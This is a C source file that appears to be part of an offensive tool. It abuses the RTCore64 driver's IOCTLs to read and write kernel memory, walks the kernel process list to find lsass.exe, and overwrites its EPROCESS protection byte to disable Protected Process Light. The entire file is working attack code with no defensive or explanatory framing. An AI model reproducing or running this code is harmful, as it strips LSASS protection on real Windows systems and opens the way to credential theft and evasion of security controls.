#include "memory.h"
#include "driver.h"
#include "logger.h"
#include "offsets.h"
#include "osinfo.h"
#include <string.h>

// =====================================================
// Memory Access Primitives via RTCore64
// =====================================================

#if defined(__STDC_VERSION__) && __STDC_VERSION__ >= 201112L
_Static_assert(sizeof(RTCORE64_MSR_READ) == 12, "sizeof RTCORE64_MSR_READ must be 12 bytes");
_Static_assert(sizeof(RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");
_Static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");
#endif

DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address) {
    RTCORE64_MEMORY_READ memRead = { 0 };
    memRead.Address = Address;
    memRead.ReadSize = Size;
    DWORD BytesReturned;
    DeviceIoControl(Device,
        RTC64_MEMORY_READ_CODE,
        &memRead,
        sizeof(memRead),
        &memRead,
        sizeof(memRead),
        &BytesReturned,
        NULL);
    return memRead.Value;
}

void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value) {
    RTCORE64_MEMORY_WRITE memWrite = { 0 };
    memWrite.Address = Address;
    memWrite.ReadSize = Size;
    memWrite.Value = Value;
    DWORD BytesReturned;
    DeviceIoControl(Device,
        RTC64_MEMORY_WRITE_CODE,
        &memWrite,
        sizeof(memWrite),
        &memWrite,
        sizeof(memWrite),
        &BytesReturned,
        NULL);
}

WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address) {
    return (WORD)(ReadMemoryPrimitive(Device, 2, Address) & 0xffff);
}

DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 4, Address);
}

DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address) {
    return (((DWORD64)ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
}

void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value) {
    WriteMemoryPrimitive(Device, 4, Address, (DWORD)(Value & 0xffffffff));
    WriteMemoryPrimitive(Device, 4, Address + 4, (DWORD)(Value >> 32));
}

// Helper function to read a memory buffer in 4-byte chunks
BOOL ReadMemoryBuffer(HANDLE Device, DWORD64 Address, void* Buffer, DWORD BufferSize) {
    DWORD numDwords = BufferSize / 4;
    DWORD remainder = BufferSize % 4;
    for (DWORD i = 0; i < numDwords; i++) {
        ((DWORD*)Buffer)[i] = ReadMemoryDWORD(Device, Address + i * 4);
    }
    if (remainder) {
        DWORD value = ReadMemoryPrimitive(Device, remainder, Address + numDwords * 4);
        memcpy((BYTE*)Buffer + numDwords * 4, &value, remainder);
    }
    return TRUE;
}

// =====================================================
// Function to Read the EPROCESS Structure of lsass.exe
// =====================================================

void disablePPL() {

    Offsets offs = getOffsets();
    if (offs.ActiveProcessLinks == 0 || offs.ImageFileName == 0 || offs.Protection == 0) {
        log_error("Offset not mapped... exiting!");
        exit(1);
    }

    HANDLE Device = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (Device == INVALID_HANDLE_VALUE) {
        log_error("Unable to obtain a handle to the device object");
        return;
    }
    log_info("Device handle obtained");

    unsigned long long ntoskrnlBase = getKBAddr();
    log_info("ntoskrnl.exe base address: 0x%llx", ntoskrnlBase);

    HMODULE hNtoskrnl = LoadLibraryW(L"ntoskrnl.exe");
    if (!hNtoskrnl) {
        log_error("Failed to load ntoskrnl.exe");
        CloseHandle(Device);
        return;
    }
    // Calculate the offset of the exported variable PsInitialSystemProcess
    DWORD64 PsInitialSystemProcessOffset = (DWORD64)GetProcAddress(hNtoskrnl, "PsInitialSystemProcess") - (DWORD64)hNtoskrnl;
    FreeLibrary(hNtoskrnl);

    // Retrieve the address of the System process's EPROCESS
    DWORD64 SystemProcessEPROCESS = ReadMemoryDWORD64(Device, ntoskrnlBase + PsInitialSystemProcessOffset);
    log_info("PsInitialSystemProcess (EPROCESS) address: 0x%llx", SystemProcessEPROCESS);

    // Calculate the list head (located within the EPROCESS)
    DWORD64 ListHead = SystemProcessEPROCESS + offs.ActiveProcessLinks;
    DWORD64 CurrentEntry = ReadMemoryDWORD64(Device, ListHead); // First element of the list

    while (CurrentEntry != ListHead) {
        // The current EPROCESS address is obtained by subtracting the offset from the LIST_ENTRY pointer
        DWORD64 eprocess = CurrentEntry - offs.ActiveProcessLinks;

        // Read the ImageFileName field (15 bytes, as defined in the struct) and add a null terminator
        char imageName[16] = { 0 };
        ReadMemoryBuffer(Device, eprocess + offs.ImageFileName, imageName, 15);
        imageName[15] = '\0';

        if (_stricmp(imageName, "lsass.exe") == 0) {
            log_info("Found EPROCESS at 0x%llx", eprocess);
            // Read the protection byte (PPL) from the EPROCESS
            BYTE protection = (BYTE)ReadMemoryPrimitive(Device, 1, eprocess + offs.Protection);
            log_info("Protection value: 0x%02X", protection);

            // To disable PPL, write 0x00 into this field.
            // Warning: perform this operation only if you are sure the offsets are correct.
            WriteMemoryPrimitive(Device, 1, eprocess + offs.Protection, 0x00);
            log_success("PPL disabled (0x00 written)");

            // Read the protection byte (PPL) from the EPROCESS again
            BYTE protection_post = (BYTE)ReadMemoryPrimitive(Device, 1, eprocess + offs.Protection);
            log_info("Protection value after write: 0x%02X", protection_post);

            break;
        }
        // Move to the next element in the list
        CurrentEntry = ReadMemoryDWORD64(Device, CurrentEntry);
    }

    CloseHandle(Device);
}